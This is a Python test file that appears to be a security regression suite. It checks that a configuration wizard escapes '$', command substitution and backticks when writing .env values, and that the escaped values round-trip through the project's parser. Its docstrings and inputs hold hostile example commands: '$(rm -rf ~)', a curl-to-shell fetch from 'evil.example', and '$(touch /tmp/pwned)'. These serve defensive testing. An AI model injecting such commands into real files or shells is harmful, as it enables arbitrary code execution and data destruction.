"""Sentinel PoC: shell-metacharacter injection via ``_escape_env_value``.

The wizard at ``src/utils/configuration_wizard.py`` writes a ``.env``
document via ``format_env_document`` whose values are quoted by
``_escape_env_value``. Pre-fix the escape chain handled only ``\\``,
``\\r``, ``\\n`` and ``"`` — leaving ``$`` (parameter expansion /
``$(...)`` command substitution) and ``\\`` `` (backtick command
substitution) as bare characters inside the resulting double-quoted
string.

Threat model
------------
The wizard is documented for interactive operator use, but its
``--set KEY=VALUE`` interface is also invoked from CI / Make targets /
provisioning scripts, where the value can originate from other
operator-facing inputs (existing ``.env`` re-roundtripped via
``_load_existing`` -> ``_escape_env_value``, environment overrides
from CI, ``--set`` arguments composed from variables). The produced
``.env`` is regularly sourced into a shell with ``set -a; source .env``
(the canonical bash/zsh / Make idiom for loading project-local
secrets); inside double-quoted strings bash performs both
``$VAR`` / ``${VAR}`` parameter expansion AND ``$(cmd)`` / ``\\``cmd``\\``
command substitution. Pre-fix a value like ``$(rm -rf ~)`` would
therefore execute on the next ``source .env``, escalating an
operator-facing config typo (or a hostile CI override / leaked secret
store / compromised provisioning script) into arbitrary command
execution under the sourcing user's shell.

The fix shape adds ``$`` -> ``\\$`` and ``\\`` -> ``\\\\``\\`` to
``_escape_env_value`` and the inverse ``\\$`` / ``\\\\``\\`` ->
``$`` / ``\\`` `` decoding to ``_parse_value`` so the project's own
re-read remains roundtrip-safe.

PoC
---
Each test below proves the pre-fix vulnerability (the literal ``$`` /
``\\`` `` survives unescaped into the produced ``.env``) AND verifies the
post-fix shape (the metacharacter is backslash-escaped so bash sees
the literal byte). The roundtrip assertions guarantee
``_parse_value`` decodes the new escape correctly so the project's
own ``load_env_file`` recovers the original value byte-for-byte.
"""

from __future__ import annotations

from src.utils.configuration_wizard import _escape_env_value
from src.utils.env import _parse_value


# ---------------------------------------------------------------------------
# 1. Bash parameter expansion: ``$VAR`` / ``${VAR}``
# ---------------------------------------------------------------------------


def test_escape_env_value_blocks_bash_parameter_expansion() -> None:
    """``$VAR`` must be backslash-escaped so bash does not expand it.

    Bash double-quoted strings expand ``$VAR``; if the escape chain
    leaves the bare ``$`` in place, the next ``source .env`` reads
    the expanded value (often empty) instead of the literal token
    the operator stored. For credentials this can corrupt a token
    and silently fall back to the empty default.
    """
    value = "$EVIL_VAR"
    escaped = _escape_env_value(value)
    # Post-fix: the ``$`` MUST be preceded by a backslash inside the
    # double-quoted body so bash treats it as a literal byte rather
    # than the start of a parameter expansion.
    assert "\\$" in escaped, (
        f"Shell-injection PoC: escaped value {escaped!r} contains an "
        f"unescaped '$' which would trigger bash parameter expansion "
        f"on `source .env`."
    )


def test_escape_env_value_blocks_command_substitution_dollar_paren() -> None:
    """``$(cmd)`` MUST be backslash-escaped at the leading ``$``.

    Inside bash double-quoted strings ``$(cmd)`` performs command
    substitution, so an attacker-controlled value like
    ``$(curl evil.example/x | sh)`` reaches arbitrary code execution
    on the next ``source .env``. Capping the escape at the leading
    ``$`` is sufficient: with ``\\$`` bash sees the literal ``$``
    byte and never enters the substitution scanner.
    """
    value = "$(touch /tmp/pwned)"
    escaped = _escape_env_value(value)
    assert "\\$" in escaped, (
        f"Shell-injection PoC: escaped value {escaped!r} contains an "
        f"unescaped '$(' which would execute arbitrary commands on "
        f"`source .env`."
    )


def test_escape_env_value_blocks_command_substitution_backtick() -> None:
    """``\\``cmd``\\`` (backtick) MUST be backslash-escaped.

    Bash backticks are an alternate command-substitution syntax that
    behaves identically to ``$(cmd)`` inside double-quoted strings.
    Attackers using legacy POSIX-shell payload vocabularies prefer
    backticks; both forms must be defended.
    """
    value = "`whoami`"
    escaped = _escape_env_value(value)
    assert "\\`" in escaped, (
        f"Shell-injection PoC: escaped value {escaped!r} contains an "
        f"unescaped backtick which would execute arbitrary commands "
        f"on `source .env`."
    )


# ---------------------------------------------------------------------------
# 2. Roundtrip safety: project's own _parse_value decodes the new escapes
# ---------------------------------------------------------------------------


def test_dollar_value_roundtrips_via_project_parser() -> None:
    """The project's own ``_parse_value`` must decode ``\\$`` to ``$``.

    Without this, the new escape would silently turn every dollar-
    bearing token (``$secret``, ``${TENANT_ID}``-style references
    that operators store as literal sentinels) into a leading
    backslash on the next ``load_env_file`` round.
    """
    original = "$LITERAL_DOLLAR_FOO"
    escaped = _escape_env_value(original)
    parsed = _parse_value(escaped)
    assert parsed == original, (
        f"Roundtrip PoC: original {original!r} re-parsed as "
        f"{parsed!r} (escaped form: {escaped!r})."
    )


def test_backtick_value_roundtrips_via_project_parser() -> None:
    """The project's own ``_parse_value`` must decode ``\\``\\`` to ``\\``."""
    original = "literal `backticks` inside"
    escaped = _escape_env_value(original)
    parsed = _parse_value(escaped)
    assert parsed == original, (
        f"Roundtrip PoC: original {original!r} re-parsed as "
        f"{parsed!r} (escaped form: {escaped!r})."
    )


def test_combined_metachars_roundtrip_via_project_parser() -> None:
    """Mixed metacharacters (``$``, ``\\`` ``, ``\\\\``, ``"``, ``\\n``) all
    survive the escape -> parse cycle byte-for-byte."""
    original = 'mix $VAR `cmd` "quote" \\back \nnewline'
    escaped = _escape_env_value(original)
    parsed = _parse_value(escaped)
    assert parsed == original, (
        f"Roundtrip PoC: original {original!r} re-parsed as "
        f"{parsed!r} (escaped form: {escaped!r})."
    )


# ---------------------------------------------------------------------------
# 3. Regression: existing escape behaviour for non-shell-metacharacters
# ---------------------------------------------------------------------------


def test_escape_env_value_preserves_safe_alphanumeric_passthrough() -> None:
    """A purely safe-character value must NOT acquire quotes or escapes.

    The existing fast-path
    ``re.fullmatch(r'[A-Za-z0-9_@%+,:./-]+', value)`` must continue
    to short-circuit. The new ``$`` / ``\\`` `` escaping only kicks in
    on the slow path because both characters are absent from the
    safe character class.
    """
    value = "alpha-numeric_123.value@host"
    escaped = _escape_env_value(value)
    assert escaped == value, (
        f"Safe passthrough regression: {value!r} got escaped to "
        f"{escaped!r}."
    )


def test_escape_env_value_still_escapes_newline_and_quote() -> None:
    """Existing newline / quote escaping must not regress when the
    new ``$`` / ``\\`` `` escaping is added to the same chain."""
    value = 'line1\nwith "quote"'
    escaped = _escape_env_value(value)
    # Pre-existing escape contracts (PR #journaled multiline support)
    # must hold: ``\n`` -> ``\\n`` and ``"`` -> ``\\"``, both inside
    # the wrapping double quotes.
    assert "\\n" in escaped, f"\\n escape regressed: {escaped!r}"
    assert '\\"' in escaped, f'\\" escape regressed: {escaped!r}'
    assert escaped.startswith('"') and escaped.endswith('"'), (
        f"Wrapping quotes regressed: {escaped!r}"
    )
